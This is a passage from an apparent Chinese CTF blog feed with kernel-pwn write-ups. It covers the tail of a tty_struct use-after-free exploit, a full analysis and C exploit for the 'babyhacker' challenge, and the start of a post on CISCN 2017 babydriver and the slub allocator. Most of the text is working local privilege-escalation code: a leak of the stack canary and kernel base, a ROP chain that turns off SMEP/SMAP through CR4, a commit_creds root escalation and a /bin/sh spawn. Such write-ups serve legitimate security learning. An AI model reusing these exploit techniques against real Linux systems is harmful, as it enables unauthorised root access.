class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_1, fd_2;</span><br><span class="line">    <span class="keyword">int</span> fd_ptmx;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">size_t</span> *rop;</span><br><span class="line">    <span class="keyword">void</span> *fake_tty_operations[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_addr, iret_addr, pop_rdi_addr, mov_cr4_rdi_addr, xchg_eax_esp;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// open the device twice</span></span><br><span class="line">    fd_1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    fd_2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// malloc a chunk with sizeof(struct tty_struct)</span></span><br><span class="line">    ioctl(fd_1, COM_MALLOC, <span class="number">0x2E0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the chunk</span></span><br><span class="line">    <span class="built_in">close</span>(fd_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open device ptmx</span></span><br><span class="line">    fd_ptmx = <span class="built_in">open</span>(<span class="string">"/dev/ptmx"</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span>(fd_ptmx == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Device ptmx open failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] Device ptmx open successfully!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save status</span></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop chain</span></span><br><span class="line">    pop_rdi_addr = <span class="number">0xffffffff810d238d</span>;  <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    mov_cr4_rdi_addr = <span class="number">0xffffffff81004d80</span>; <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    swapgs_addr = <span class="number">0xffffffff81063694</span>;  <span class="comment">// swapgs_pop_rbp_ret;</span></span><br><span class="line">    iret_addr = <span class="number">0xffffffff8181a797</span>; <span class="comment">// iretq;</span></span><br><span class="line">    xchg_eax_esp = <span class="number">0xffffffff81007808</span>; <span class="comment">// xchg eax, esp; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmap rop memory</span></span><br><span class="line">    rop = mmap((<span class="keyword">void</span> *)<span class="number">0x81000000</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(rop == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Mmap failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = pop_rdi_addr;  </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0x6f0</span>;  <span class="comment">// cr4</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = mov_cr4_rdi_addr; </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = (<span class="keyword">size_t</span>)&amp;priviledge_escalation;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = swapgs_addr;  </span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = <span class="number">0</span>; <span class="comment">// rbp;</span></span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = iret_addr;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = (<span class="keyword">size_t</span>)&amp;getshell;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_cs;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_rflags;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_sp;</span><br><span class="line">    rop[<span class="number">0x7808</span> / <span class="number">8</span> + i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake tty_operations</span></span><br><span class="line">    fake_tty_operations[<span class="number">12</span>] = (<span class="keyword">void</span> *)xchg_eax_esp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// modify tty_struct-&gt;tty_operations</span></span><br><span class="line">    <span class="built_in">read</span>(fd_2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] The first qword of tty_struct: %lx\n"</span>, *fake_tty_struct);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    <span class="built_in">write</span>(fd_2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl ptmx</span></span><br><span class="line">    ioctl(fd_ptmx, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2020高校战疫分享赛-babyhacker"><a href="#2020高校战疫分享赛-babyhacker" class="headerlink" title="2020高校战疫分享赛 babyhacker"></a>2020高校战疫分享赛 babyhacker</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">stty intr ^]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>开了smep，smap，kaslr以及canary。<br>解包文件系统，提取babyhacker.ko，分析<code>ioctl</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">  __int16 v5; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (__int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      babyhacker_ioctl_0(rdx1, *(__int64 *)&amp;cmd, (<span class="keyword">unsigned</span> __int64)rdx1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)rdx1 &gt;= <span class="number">11</span> )</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl_0</span><span class="params">(file *file, __int64 cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v7 = v3;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> copy_from_user(v4, file, buffersize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，很明显的功能<code>0x30000</code>中，<code>(int)rdx1 &gt;= 11</code>只是截取了<code>rdx1</code>的低4 bytes，并作为<code>int</code>类型进行解析，若为负数则可以直接绕过此check。<br>而后续的对<code>buffersize = v5</code>的赋值，<code>v5 = (__int16)rdx1;</code>，截取了<code>rdx1</code>的低2 bytes作为长度值，所以这里<code>v5</code>的范围为<code>0x0 ~ 0xFFFF</code>。<br>那么在调用<code>0x30001</code>功能的时候，<code>copy_from_user(v4, file, buffersize)</code>中<code>buffersize</code>最大为<code>0xFFFF</code>，而<code>v4</code>最大为<code>0x50</code>。<br>同样的，<code>0x30002</code>功能也能读到<code>v4</code>之后的栈上的内容。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先利用OOB，读出canary以及栈上存在的vmlinux代码段残留地址，计算出vmlinux_base。</li><li>从bzImage中提取出vmlinux，然后搜索gadgets。</li><li>同上题，构造rop，依次bypass smep和smap，然后提权，返回用户态起shell。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_CMD 0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_CMD 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_CMD 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MASK 0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int64_t</span> prepare_kernel_cred_offset = <span class="number">0xffffffff8dc19218</span> - <span class="number">0xffffffff8daa1820</span>;</span><br><span class="line"><span class="keyword">int64_t</span> commit_creds_offset = <span class="number">0xffffffff8dc19218</span> - <span class="number">0xffffffff8daa1430</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> prepare_kernel_cred, commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[!] status saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = commit_creds;</span><br><span class="line"></span><br><span class="line">    cc(pkc(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] failed\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"swapgs;"</span></span><br><span class="line">            <span class="string">"iretq;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_rsp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"sub rsp, 0x178;"</span></span><br><span class="line">            <span class="string">"ret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, SIZE_CMD, <span class="number">0x158</span> | MASK);</span><br><span class="line">    ioctl(fd, READ_CMD, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> canary = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x140</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_addr = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x150</span>);</span><br><span class="line">    prepare_kernel_cred = vmlinux_addr - prepare_kernel_cred_offset;</span><br><span class="line">    commit_creds = vmlinux_addr - commit_creds_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] canary is: %lx\n"</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred address is: %lx\n"</span>, prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] commit_creds address is: %lx\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = vmlinux_addr - <span class="number">0x219218</span> + <span class="number">0x9054d</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_cr4_rdi = vmlinux_addr - <span class="number">0x219218</span> + <span class="number">0x4d70</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base = <span class="number">0x140</span> / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx] = (<span class="keyword">uint64_t</span>)privilege;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] += <span class="number">4</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx] = (<span class="keyword">uint64_t</span>)retq;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] += <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_cs;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_rflags;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_sp;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = canary;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = pop_rdi;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0x6e0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = mov_cr4_rdi;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx] = (<span class="keyword">uint64_t</span>)sub_rsp;</span><br><span class="line">    ((<span class="keyword">uint64_t</span> *)buf)[base + idx++] += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, SIZE_CMD, (<span class="number">0x140</span> + idx * <span class="number">8</span>) | MASK);</span><br><span class="line">    ioctl(fd, WRITE_CMD, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/bypass_smep-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/bypass_smep-zh/</a></li><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="http://www.g3n3rous.fun/index.php/archives/7/" target="_blank" rel="noopener">http://www.g3n3rous.fun/index.php/archives/7/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面只找到qwb的题目，这次突然又看到安全客上“Kernel Pwn 学习之路（二）”有蛮多以往的ROP赛题，算是再补充一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.github.io/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: UAF</title>
    <link href="https://n0nop.github.io/2020/05/12/kernel-pwn-UAF/"/>
    <id>https://n0nop.github.io/2020/05/12/kernel-pwn-UAF/</id>
    <published>2020-05-12T12:46:39.000Z</published>
    <updated>2020-05-12T15:16:31.566Z</updated>
    
    <content type="html"><![CDATA[<p>因为课程作业里接触到了uaf的kernel pwn，虽然比较基础，但是还是有那么点基础，理解起来不会很吃力。这次复现的是CISCN 2017的一个kernel pwn babydriver，比较简单的UAF，但是还是有一些细节知识值得学习。</p><a id="more"></a><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="slub分配器"><a href="#slub分配器" class="headerlink" title="slub分配器"></a>slub分配器</h2><p>先贴张图:<br><img src="/2020/05/12/kernel-pwn-UAF/slub.png" alt><br>简单地了解一下内核内存管理的一些简单的特点，至于更深入的代码细节可以参考”Kernel Pwn 学习之路”系列文章。</p><ol><li>与glibc中的<code>malloc</code>有点相同的是，<code>kmalloc</code>同样需要对齐到某些特定的大小，只不过这个范围更加特殊。通过<code>sudo cat /proc/slabinfo | grep &quot;^kmalloc&quot;</code>查看可以分配的object大小。 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-8192         479    500   8192    4    8 : tunables    0    0    0 : slabdata    125    125      0</span><br><span class="line">kmalloc-4096        1356   1384   4096    8    8 : tunables    0    0    0 : slabdata    173    173      0</span><br><span class="line">kmalloc-2048        2322   2368   2048   16    8 : tunables    0    0    0 : slabdata    148    148      0</span><br><span class="line">kmalloc-1024        6702   6720   1024   32    8 : tunables    0    0    0 : slabdata    210    210      0</span><br><span class="line">kmalloc-512        30090  30464    512   64    8 : tunables    0    0    0 : slabdata    476    476      0</span><br><span class="line">kmalloc-256       187245 187328    256   64    4 : tunables    0    0    0 : slabdata   2927   2927      0</span><br><span class="line">kmalloc-192         5858   6174    192   42    2 : tunables    0    0    0 : slabdata    147    147      0</span><br><span class="line">kmalloc-128         3304   3904    128   64    2 : tunables    0    0    0 : slabdata     61     61      0</span><br><span class="line">kmalloc-96        193746 193746     96   42    1 : tunables    0    0    0 : slabdata   4613   4613      0</span><br><span class="line">kmalloc-64         54702  85696     64   64    1 : tunables    0    0    0 : slabdata   1339   1339      0</span><br><span class="line">kmalloc-32         14245  15744     32  128    1 : tunables    0    0    0 : slabdata    123    123      0</span><br><span class="line">kmalloc-16         15616  15616     16  256    1 : tunables    0    0    0 : slabdata     61     61      0</span><br><span class="line">kmalloc-8          16384  16384      8  512    1 : tunables    0    0    0 : slabdata     32     32      0</span><br></pre></td></tr></table></figure> 因此当需要分配一块内存的时候，chunk的大小会向上对齐到满足需求的最小的那个object size。</li><li>一般来说，<code>kmalloc</code>分配出来的chunk在物理地址上都是连续的，（有时会出现第一个chunk不连续的情况）。也就是说slub分配器中维护的<code>freelist</code>，存放一个单向链表，这个链表将该slub中空闲的object串起来，通过设置object首8 bytes（x86为4 